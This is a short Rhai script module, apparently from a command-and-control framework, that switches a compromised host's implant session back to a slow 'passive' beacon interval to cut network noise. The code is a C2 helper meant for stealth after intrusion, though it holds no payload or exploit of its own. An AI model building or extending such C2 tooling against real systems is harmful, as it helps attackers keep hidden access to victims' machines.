// modules/passive.rhai
//
// Returns the session to its configured sleep interval (passive beacon mode).
// Use after fast-mode work is done to reduce network noise.

fn run(session_id) {
    let status = send_c2_command(session_id, "beacon:mode passive");
    print("Passive mode set for session " + session_id + " — " + status);
    "Passive"
}
